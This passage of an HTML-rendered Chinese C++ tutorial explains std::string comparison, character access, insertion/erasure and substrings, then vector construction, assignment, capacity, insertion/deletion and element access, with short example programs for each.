<li>字符串之间的比较</li>
</ul>
<p><strong>比较方式：</strong></p>
<ul>
<li>字符串比较是按字符的ASCII码进行对比</li>
</ul>
<p>&#x3D; 返回   0</p>
<p>&gt; 返回   1 </p>
<p>&lt; 返回  -1</p>
<p><strong>函数原型：</strong></p>
<ul>
<li><code>int compare(const string &amp;s) const; </code>  &#x2F;&#x2F;与字符串s比较</li>
<li><code>int compare(const char *s) const;</code>      &#x2F;&#x2F;与字符串s比较</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//字符串比较</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	string s1 = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">	string s2 = <span class="string">&quot;aello&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> ret = s<span class="number">1.</span><span class="built_in">compare</span>(s2);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (ret == <span class="number">0</span>) &#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;s1 等于 s2&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span> (ret &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;s1 大于 s2&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;s1 小于 s2&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：字符串对比主要是用于比较两个字符串是否相等，判断谁大谁小的意义并不是很大</p>
<h4 id="3-1-7-string字符存取"><a href="#3-1-7-string字符存取" class="headerlink" title="3.1.7 string字符存取"></a>3.1.7 string字符存取</h4><p>string中单个字符存取方式有两种</p>
<ul>
<li><code>char&amp; operator[](int n); </code>     &#x2F;&#x2F;通过[]方式取字符</li>
<li><code>char&amp; at(int n);   </code>                    &#x2F;&#x2F;通过at方法获取字符</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	string str = <span class="string">&quot;hello world&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; str.<span class="built_in">size</span>(); i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; str[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; str.<span class="built_in">size</span>(); i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; str.<span class="built_in">at</span>(i) &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="comment">//字符修改</span></span><br><span class="line">	str[<span class="number">0</span>] = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line">	str.<span class="built_in">at</span>(<span class="number">1</span>) = <span class="string">&#x27;x&#x27;</span>;</span><br><span class="line">	cout &lt;&lt; str &lt;&lt; endl;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：string字符串中单个字符存取有两种方式，利用 [ ] 或 at</p>
<h4 id="3-1-8-string插入和删除"><a href="#3-1-8-string插入和删除" class="headerlink" title="3.1.8 string插入和删除"></a>3.1.8 string插入和删除</h4><p><strong>功能描述：</strong></p>
<ul>
<li>对string字符串进行插入和删除字符操作</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><code>string&amp; insert(int pos, const char* s);  </code>                &#x2F;&#x2F;插入字符串</li>
<li><code>string&amp; insert(int pos, const string&amp; str); </code>        &#x2F;&#x2F;插入字符串</li>
<li><code>string&amp; insert(int pos, int n, char c);</code>                &#x2F;&#x2F;在指定位置插入n个字符c</li>
<li><code>string&amp; erase(int pos, int n = npos);</code>                    &#x2F;&#x2F;删除从Pos开始的n个字符</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//字符串插入和删除</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	string str = <span class="string">&quot;hello&quot;</span>;</span><br><span class="line">	str.<span class="built_in">insert</span>(<span class="number">1</span>, <span class="string">&quot;111&quot;</span>);</span><br><span class="line">	cout &lt;&lt; str &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	str.<span class="built_in">erase</span>(<span class="number">1</span>, <span class="number">3</span>);  <span class="comment">//从1号位置开始3个字符</span></span><br><span class="line">	cout &lt;&lt; str &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结：</strong>插入和删除的起始下标都是从0开始</p>
<h4 id="3-1-9-string子串"><a href="#3-1-9-string子串" class="headerlink" title="3.1.9 string子串"></a>3.1.9 string子串</h4><p><strong>功能描述：</strong></p>
<ul>
<li>从字符串中获取想要的子串</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><code>string substr(int pos = 0, int n = npos) const;</code>   &#x2F;&#x2F;返回由pos开始的n个字符组成的字符串</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//子串</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">	string str = <span class="string">&quot;abcdefg&quot;</span>;</span><br><span class="line">	string subStr = str.<span class="built_in">substr</span>(<span class="number">1</span>, <span class="number">3</span>);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;subStr = &quot;</span> &lt;&lt; subStr &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	string email = <span class="string">&quot;hello@sina.com&quot;</span>;</span><br><span class="line">	<span class="type">int</span> pos = email.<span class="built_in">find</span>(<span class="string">&quot;@&quot;</span>);</span><br><span class="line">	string username = email.<span class="built_in">substr</span>(<span class="number">0</span>, pos);</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;username: &quot;</span> &lt;&lt; username &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结：</strong>灵活的运用求子串功能，可以在实际开发中获取有效的信息</p>
<h3 id="3-2-vector容器"><a href="#3-2-vector容器" class="headerlink" title="3.2 vector容器"></a>3.2 vector容器</h3><h4 id="3-2-1-vector基本概念"><a href="#3-2-1-vector基本概念" class="headerlink" title="3.2.1 vector基本概念"></a>3.2.1 vector基本概念</h4><p><strong>功能：</strong></p>
<ul>
<li>vector数据结构和<strong>数组非常相似</strong>，也称为<strong>单端数组</strong></li>
</ul>
<p><strong>vector与普通数组区别：</strong></p>
<ul>
<li>不同之处在于数组是静态空间，而vector可以<strong>动态扩展</strong></li>
</ul>
<p><strong>动态扩展：</strong></p>
<ul>
<li>并不是在原空间之后续接新空间，而是找更大的内存空间，然后将原数据拷贝新空间，释放原空间</li>
</ul>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/C++%E6%8F%90%E9%AB%98%E7%BC%96%E7%A8%8B/clip_image002.jpg"
                      alt="说明: 2015-11-10_151152"
                ></p>
<ul>
<li>vector容器的迭代器是支持随机访问的迭代器</li>
</ul>
<h4 id="3-2-2-vector构造函数"><a href="#3-2-2-vector构造函数" class="headerlink" title="3.2.2 vector构造函数"></a>3.2.2 vector构造函数</h4><p><strong>功能描述：</strong></p>
<ul>
<li>创建vector容器</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><code>vector&lt;T&gt; v; </code>               		     &#x2F;&#x2F;采用模板实现类实现，默认构造函数</li>
<li><code>vector(v.begin(), v.end());   </code>       &#x2F;&#x2F;将v[begin(), end())区间中的元素拷贝给本身。</li>
<li><code>vector(n, elem);</code>                            &#x2F;&#x2F;构造函数将n个elem拷贝给本身。</li>
<li><code>vector(const vector &amp;vec);</code>         &#x2F;&#x2F;拷贝构造函数。</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printVector</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; v)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt;::iterator it = v.<span class="built_in">begin</span>(); it != v.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v1; <span class="comment">//无参构造</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		v<span class="number">1.</span><span class="built_in">push_back</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printVector</span>(v1);</span><br><span class="line"></span><br><span class="line">	<span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">v2</span><span class="params">(v<span class="number">1.</span>begin(), v<span class="number">1.</span>end())</span></span>;</span><br><span class="line">	<span class="built_in">printVector</span>(v2);</span><br><span class="line"></span><br><span class="line">	<span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">v3</span><span class="params">(<span class="number">10</span>, <span class="number">100</span>)</span></span>;</span><br><span class="line">	<span class="built_in">printVector</span>(v3);</span><br><span class="line">	</span><br><span class="line">	<span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">v4</span><span class="params">(v3)</span></span>;</span><br><span class="line">	<span class="built_in">printVector</span>(v4);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><strong>总结：</strong>vector的多种构造方式没有可比性，灵活使用即可</p>
<h4 id="3-2-3-vector赋值操作"><a href="#3-2-3-vector赋值操作" class="headerlink" title="3.2.3 vector赋值操作"></a>3.2.3 vector赋值操作</h4><p><strong>功能描述：</strong></p>
<ul>
<li>给vector容器进行赋值</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><p><code>vector&amp; operator=(const vector &amp;vec);</code>&#x2F;&#x2F;重载等号操作符</p>
</li>
<li><p><code>assign(beg, end);</code>       &#x2F;&#x2F;将[beg, end)区间中的数据拷贝赋值给本身。</p>
</li>
<li><p><code>assign(n, elem);</code>        &#x2F;&#x2F;将n个elem拷贝赋值给本身。</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printVector</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; v)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt;::iterator it = v.<span class="built_in">begin</span>(); it != v.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//赋值操作</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v1; <span class="comment">//无参构造</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		v<span class="number">1.</span><span class="built_in">push_back</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printVector</span>(v1);</span><br><span class="line"></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;v2;</span><br><span class="line">	v2 = v1;</span><br><span class="line">	<span class="built_in">printVector</span>(v2);</span><br><span class="line"></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;v3;</span><br><span class="line">	v<span class="number">3.</span><span class="built_in">assign</span>(v<span class="number">1.</span><span class="built_in">begin</span>(), v<span class="number">1.</span><span class="built_in">end</span>());</span><br><span class="line">	<span class="built_in">printVector</span>(v3);</span><br><span class="line"></span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;v4;</span><br><span class="line">	v<span class="number">4.</span><span class="built_in">assign</span>(<span class="number">10</span>, <span class="number">100</span>);</span><br><span class="line">	<span class="built_in">printVector</span>(v4);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>总结： vector赋值方式比较简单，使用operator&#x3D;，或者assign都可以</p>
<h4 id="3-2-4-vector容量和大小"><a href="#3-2-4-vector容量和大小" class="headerlink" title="3.2.4  vector容量和大小"></a>3.2.4  vector容量和大小</h4><p><strong>功能描述：</strong></p>
<ul>
<li>对vector容器的容量和大小操作</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><p><code>empty(); </code>                            &#x2F;&#x2F;判断容器是否为空</p>
</li>
<li><p><code>capacity();</code>                      &#x2F;&#x2F;容器的容量</p>
</li>
<li><p><code>size();</code>                              &#x2F;&#x2F;返回容器中元素的个数</p>
</li>
<li><p><code>resize(int num);</code>             &#x2F;&#x2F;重新指定容器的长度为num，若容器变长，则以默认值填充新位置。</p>
<p>​					      &#x2F;&#x2F;如果容器变短，则末尾超出容器长度的元素被删除。</p>
</li>
<li><p><code>resize(int num, elem);</code>  &#x2F;&#x2F;重新指定容器的长度为num，若容器变长，则以elem值填充新位置。</p>
<p>​				              &#x2F;&#x2F;如果容器变短，则末尾超出容器长度的元素被删除</p>
</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printVector</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; v)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt;::iterator it = v.<span class="built_in">begin</span>(); it != v.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v1;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		v<span class="number">1.</span><span class="built_in">push_back</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printVector</span>(v1);</span><br><span class="line">	<span class="keyword">if</span> (v<span class="number">1.</span><span class="built_in">empty</span>())</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;v1为空&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;v1不为空&quot;</span> &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;v1的容量 = &quot;</span> &lt;&lt; v<span class="number">1.</span><span class="built_in">capacity</span>() &lt;&lt; endl;</span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;v1的大小 = &quot;</span> &lt;&lt; v<span class="number">1.</span><span class="built_in">size</span>() &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//resize 重新指定大小 ，若指定的更大，默认用0填充新位置，可以利用重载版本替换默认填充</span></span><br><span class="line">	v<span class="number">1.</span><span class="built_in">resize</span>(<span class="number">15</span>,<span class="number">10</span>);</span><br><span class="line">	<span class="built_in">printVector</span>(v1);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//resize 重新指定大小 ，若指定的更小，超出部分元素被删除</span></span><br><span class="line">	v<span class="number">1.</span><span class="built_in">resize</span>(<span class="number">5</span>);</span><br><span class="line">	<span class="built_in">printVector</span>(v1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>判断是否为空  — empty</li>
<li>返回元素个数  — size</li>
<li>返回容器容量  — capacity</li>
<li>重新指定大小  —  resize</li>
</ul>
<h4 id="3-2-5-vector插入和删除"><a href="#3-2-5-vector插入和删除" class="headerlink" title="3.2.5 vector插入和删除"></a>3.2.5 vector插入和删除</h4><p><strong>功能描述：</strong></p>
<ul>
<li>对vector容器进行插入、删除操作</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><code>push_back(ele);</code>                                         &#x2F;&#x2F;尾部插入元素ele</li>
<li><code>pop_back();</code>                                                &#x2F;&#x2F;删除最后一个元素</li>
<li><code>insert(const_iterator pos, ele);</code>        &#x2F;&#x2F;迭代器指向位置pos插入元素ele</li>
<li><code>insert(const_iterator pos, int count,ele);</code>&#x2F;&#x2F;迭代器指向位置pos插入count个元素ele</li>
<li><code>erase(const_iterator pos);</code>                     &#x2F;&#x2F;删除迭代器指向的元素</li>
<li><code>erase(const_iterator start, const_iterator end);</code>&#x2F;&#x2F;删除迭代器从start到end之间的元素</li>
<li><code>clear();</code>                                                        &#x2F;&#x2F;删除容器中所有元素</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">printVector</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; v)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (vector&lt;<span class="type">int</span>&gt;::iterator it = v.<span class="built_in">begin</span>(); it != v.<span class="built_in">end</span>(); it++) &#123;</span><br><span class="line">		cout &lt;&lt; *it &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//插入和删除</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt; v1;</span><br><span class="line">	<span class="comment">//尾插</span></span><br><span class="line">	v<span class="number">1.</span><span class="built_in">push_back</span>(<span class="number">10</span>);</span><br><span class="line">	v<span class="number">1.</span><span class="built_in">push_back</span>(<span class="number">20</span>);</span><br><span class="line">	v<span class="number">1.</span><span class="built_in">push_back</span>(<span class="number">30</span>);</span><br><span class="line">	v<span class="number">1.</span><span class="built_in">push_back</span>(<span class="number">40</span>);</span><br><span class="line">	v<span class="number">1.</span><span class="built_in">push_back</span>(<span class="number">50</span>);</span><br><span class="line">	<span class="built_in">printVector</span>(v1);</span><br><span class="line">	<span class="comment">//尾删</span></span><br><span class="line">	v<span class="number">1.</span><span class="built_in">pop_back</span>();</span><br><span class="line">	<span class="built_in">printVector</span>(v1);</span><br><span class="line">	<span class="comment">//插入</span></span><br><span class="line">	v<span class="number">1.</span><span class="built_in">insert</span>(v<span class="number">1.</span><span class="built_in">begin</span>(), <span class="number">100</span>);</span><br><span class="line">	<span class="built_in">printVector</span>(v1);</span><br><span class="line"></span><br><span class="line">	v<span class="number">1.</span><span class="built_in">insert</span>(v<span class="number">1.</span><span class="built_in">begin</span>(), <span class="number">2</span>, <span class="number">1000</span>);</span><br><span class="line">	<span class="built_in">printVector</span>(v1);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//删除</span></span><br><span class="line">	v<span class="number">1.</span><span class="built_in">erase</span>(v<span class="number">1.</span><span class="built_in">begin</span>());</span><br><span class="line">	<span class="built_in">printVector</span>(v1);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//清空</span></span><br><span class="line">	v<span class="number">1.</span><span class="built_in">erase</span>(v<span class="number">1.</span><span class="built_in">begin</span>(), v<span class="number">1.</span><span class="built_in">end</span>());</span><br><span class="line">	v<span class="number">1.</span><span class="built_in">clear</span>();</span><br><span class="line">	<span class="built_in">printVector</span>(v1);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>尾插  — push_back</li>
<li>尾删  — pop_back</li>
<li>插入  — insert    (位置迭代器)</li>
<li>删除  — erase  （位置迭代器）</li>
<li>清空  —  clear</li>
</ul>
<h4 id="3-2-6-vector数据存取"><a href="#3-2-6-vector数据存取" class="headerlink" title="3.2.6 vector数据存取"></a>3.2.6 vector数据存取</h4><p><strong>功能描述：</strong></p>
<ul>
<li>对vector中的数据的存取操作</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><code>at(int idx); </code>     &#x2F;&#x2F;返回索引idx所指的数据</li>
<li><code>operator[]; </code>       &#x2F;&#x2F;返回索引idx所指的数据</li>
<li><code>front(); </code>            &#x2F;&#x2F;返回容器中第一个数据元素</li>
<li><code>back();</code>              &#x2F;&#x2F;返回容器中最后一个数据元素</li>
</ul>
<p><strong>示例：</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">test01</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	vector&lt;<span class="type">int</span>&gt;v1;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		v<span class="number">1.</span><span class="built_in">push_back</span>(i);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; v<span class="number">1.</span><span class="built_in">size</span>(); i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; v1[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; v<span class="number">1.</span><span class="built_in">size</span>(); i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; v<span class="number">1.</span><span class="built_in">at</span>(i) &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;v1的第一个元素为： &quot;</span> &lt;&lt; v<span class="number">1.f</span>ront() &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;v1的最后一个元素为： &quot;</span> &lt;&lt; v<span class="number">1.</span><span class="built_in">back</span>() &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test01</span>();</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>总结：</p>
<ul>
<li>除了用迭代器获取vector容器中元素，[ ]和at也可以</li>
<li>front返回容器第一个元素</li>
<li>back返回容器最后一个元素</li>
</ul>
<h4 id="3-2-7-vector互换容器"><a href="#3-2-7-vector互换容器" class="headerlink" title="3.2.7 vector互换容器"></a>3.2.7 vector互换容器</h4><p><strong>功能描述：</strong></p>
<ul>
<li>实现两个容器内元素进行互换</li>
</ul>
<p><strong>函数原型：</strong></p>
<ul>
<li><code>swap(vec);</code>  &#x2F;&#x2F; 将vec与本身的元素互换</li>
</ul>
<p><strong>示例：</strong></p>
